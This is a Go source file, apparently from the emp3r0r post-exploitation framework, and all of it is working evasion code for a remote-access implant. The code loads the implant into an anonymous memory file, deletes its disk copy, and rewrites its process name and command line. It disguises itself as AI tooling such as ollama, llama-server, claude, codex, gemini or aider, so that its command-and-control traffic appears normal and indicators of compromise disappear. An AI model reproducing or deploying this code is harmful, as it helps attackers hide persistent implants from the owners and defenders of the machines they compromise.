//go:build linux
// +build linux

// Package agentutils — masquerade_linux.go
//
// AI-agent process masquerade. The stock agent was a walking IoC:
//
//	$ ps -o comm,args -C anything
//	agent_linux_amd  /home/u/.emp3r0r/agent_linux_amd64_2026-9-19_23-3-28
//
// MasqueradeSelf() fixes all three identity surfaces in one shot:
//
//   - /proc/pid/exe     → /memfd:<name> (deleted)  — the disk file can even
//     be deleted afterwards while the process keeps running (memfd holds it)
//   - /proc/pid/cmdline → a real AI toolchain invocation ("ollama serve")
//   - /proc/pid/comm    → prctl(PR_SET_NAME) to the same name
//
// The name pool is deliberately AI-agent tooling (ollama, llama.cpp, coding
// agents): on 2025+ developer and server boxes these are expected to exist,
// expected to hold long-lived encrypted connections to remote APIs, expected
// to stream tokens for hours, and expected to be restarted by supervisors.
// Every network anomaly the relay design produces is *in character* for an
// AI agent. See NETWORK_FLOW.md.
//
// No environment variables are set — the re-exec guard is
// strings.HasPrefix(/proc/self/exe, "/memfd:"), so /proc/pid/environ stays
// clean for `strings`.
package agentutils

import (
	"io"
	"os"
	"path/filepath"
	"strings"
	"unsafe"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"golang.org/x/sys/unix"
)

// masqIdentity is one cover identity: the process name as it appears in
// /proc/pid/comm (truncated to 15 bytes by the kernel) and the argv we
// present in /proc/pid/cmdline.
type masqIdentity struct {
	Comm      string   // PR_SET_NAME value (kernel truncates at 15 bytes)
	Argv      []string // execve argv — argv[0] is the name, rest are in-character flags
	MemfdName string   // memfd name, shows up as /proc/self/exe → /memfd:<name> (deleted)
}

// aiAgentPool is the cover-identity pool: AI-agent tooling that legitimately
// lives on developer machines and servers in 2025+.
var aiAgentPool = []masqIdentity{
	// ollama: the single most common local-LLM daemon; runs for weeks,
	// holds persistent connections, occasionally downloads GBs of models
	// (great cover for file transfers). Its real process name is exactly this.
	{Comm: "ollama", Argv: []string{"ollama", "serve"}, MemfdName: "ollama"},

	// ollama's actual model-runner process name (what `ollama serve` spawns);
	// comm truncates to 15 bytes, same as the real thing
	{Comm: "ollama_llama_s", Argv: []string{"/usr/share/ollama/.ollama/runners/cpu_avx2/ollama_llama_server", "--model", "qwen2.5-coder:7b"}, MemfdName: "ollama_llama_server"},

	// llama.cpp server — common on GPU boxes; flags mirror real invocations
	{Comm: "llama-server", Argv: []string{"llama-server", "--host", "127.0.0.1", "--port", "8080", "--ctx-size", "8192"}, MemfdName: "llama-server"},

	// coding agents (native CLI binaries, long-lived sessions)
	{Comm: "claude", Argv: []string{"claude"}, MemfdName: "claude"},
	{Comm: "codex", Argv: []string{"codex"}, MemfdName: "codex"},
	{Comm: "gemini", Argv: []string{"gemini"}, MemfdName: "gemini"},
	{Comm: "aider", Argv: []string{"aider"}, MemfdName: "aider"},

	// completion daemons — expected to idle with open sockets for days
	{Comm: "tabnine", Argv: []string{"tabnine"}, MemfdName: "tabnine"},
	{Comm: "gpt4all", Argv: []string{"gpt4all"}, MemfdName: "gpt4all"},
}

// MasqueradeSelf re-executes the agent from a memfd under an AI-agent
// identity. Safe to call unconditionally at startup: it is a no-op once the
// process already runs from a memfd (the re-exec guard), and it degrades
// gracefully — if memfd or fexecve fails, we still set comm and carry on.
func MasqueradeSelf() {
	exe, err := os.Executable()
	if err != nil {
		logging.Warningf("masquerade: os.Executable: %v, skipping", err)
		return
	}
	if strings.HasPrefix(exe, "/memfd:") {
		// already masqueraded by our parent invocation; enforce comm
		// (kernel derived it from the memfd name, which may exceed 15 bytes)
		setComm(truncComm(filepath.Base(os.Args[0])))
		logging.Debugf("masquerade: already running from %s", exe)
		return
	}

	id := pickIdentity(exe)

	// read own image (works while the disk file still exists), then it can
	// be deleted/replaced freely — the running process no longer needs it
	self, err := os.ReadFile(exe)
	if err != nil {
		logging.Warningf("masquerade: read self %s: %v, falling back to comm-only", exe, err)
		setComm(truncComm(id.Comm))
		return
	}

	fd, err := unix.MemfdCreate(id.MemfdName, unix.MFD_CLOEXEC)
	if err != nil {
		logging.Warningf("masquerade: memfd_create: %v, falling back to comm-only", err)
		setComm(truncComm(id.Comm))
		return
	}
	memfd := os.NewFile(uintptr(fd), "/proc/self/fd/"+itoa(fd))
	if _, err := memfd.Write(self); err != nil {
		logging.Warningf("masquerade: write memfd: %v, falling back to comm-only", err)
		memfd.Close()
		setComm(truncComm(id.Comm))
		return
	}
	if _, err := memfd.Seek(0, io.SeekStart); err != nil {
		memfd.Close()
		setComm(truncComm(id.Comm))
		return
	}

	// Self-delete: once the image sits in the memfd, the disk copy of a
	// freshly-deployed agent build (genagent names them agent_*) is a bare
	// IoC and can go. Copies managed by !persist are named after the cover
	// identity and never match, so persistence survives reboots; renamed
	// operator deployments also survive (safe default).
	if base := filepath.Base(exe); strings.HasPrefix(base, "agent_") {
		if rmErr := os.Remove(exe); rmErr != nil {
			logging.Debugf("masquerade: self-delete %s: %v", exe, rmErr)
		}
	}

	// execve: path determines the binary (/proc/self/fd/N → the memfd),
	// argv is the cover identity. CLOEXEC means the fd dies with the exec,
	// but the process mapping still pins the memfd: /proc/pid/exe keeps
	// pointing at /memfd:<name> (deleted).
	logging.Warningf("masquerade: re-exec as %q", id.Comm)
	_ = unix.Exec("/proc/self/fd/"+itoa(fd), id.Argv, util.SanitizedEnviron())

	// Exec never returns on success
	logging.Warningf("masquerade: exec failed, falling back to comm-only")
	memfd.Close()
	setComm(truncComm(id.Comm))
}

// pickIdentity resolves the cover identity for this run. A binary whose
// basename is already an AI-agent name (e.g. a copy dropped by !persist as
// ~/.local/bin/ollama) keeps that identity so the process, its on-disk name
// and its persistence unit stay consistent; anything else picks randomly.
func pickIdentity(exePath string) masqIdentity {
	for _, cand := range []string{filepath.Base(exePath), filepath.Base(os.Args[0])} {
		for _, id := range aiAgentPool {
			if cand == id.Comm || cand == id.MemfdName {
				return id
			}
		}
	}
	return aiAgentPool[util.RandInt(0, len(aiAgentPool))]
}

// MasqueradeName returns the cover identity this process runs under (the
// basename of argv[0]). Empty when the process never masqueraded (non-Linux,
// library builds, or a failed fallback that kept the stock name).
func MasqueradeName() string {
	if len(os.Args) == 0 || os.Args[0] == "" {
		return ""
	}
	base := filepath.Base(os.Args[0])
	for _, id := range aiAgentPool {
		if base == id.Comm || base == id.MemfdName {
			return id.Comm
		}
	}
	return ""
}

// MasqueradeArgv returns the cover argv with argv[0] replaced by newPath —
// what a persistence unit should ExecStart for a copy dropped at newPath.
func MasqueradeArgv(newPath string) []string {
	id := pickIdentity(newPath)
	argv := append([]string{}, id.Argv...)
	argv[0] = newPath
	return argv
}

// setComm applies prctl(PR_SET_NAME) — /proc/pid/comm and what ps/top show
// in the COMMAND column.
// setComm renames the process in /proc/pid/comm (ps/top COMMAND column).
// prctl(PR_SET_NAME) only renames the CALLING THREAD — Go's main goroutine
// may have migrated off the thread-group leader by the time we run, leaving
// the kernel-derived name (e.g. "7" from exec via /proc/self/fd/7) in
// /proc/pid/comm. Writing /proc/self/comm always targets the leader thread,
// so try that first and fall back to prctl.
func setComm(name string) {
	b := []byte(truncComm(name))
	if err := os.WriteFile("/proc/self/comm", b, 0o644); err != nil {
		logging.Debugf("masquerade: write /proc/self/comm: %v, trying prctl", err)
		if err := unix.Prctl(unix.PR_SET_NAME, uintptr(unsafe.Pointer(&b[0])), 0, 0, 0); err != nil {
			logging.Debugf("masquerade: PR_SET_NAME: %v", err)
		}
	}
}

// truncComm enforces the 15-byte comm limit.
func truncComm(name string) string {
	if len(name) > 15 {
		return name[:15]
	}
	return name
}

func itoa(i int) string {
	if i == 0 {
		return "0"
	}
	digits := []byte{}
	for i > 0 {
		digits = append([]byte{byte('0' + i%10)}, digits...)
		i /= 10
	}
	return string(digits)
}
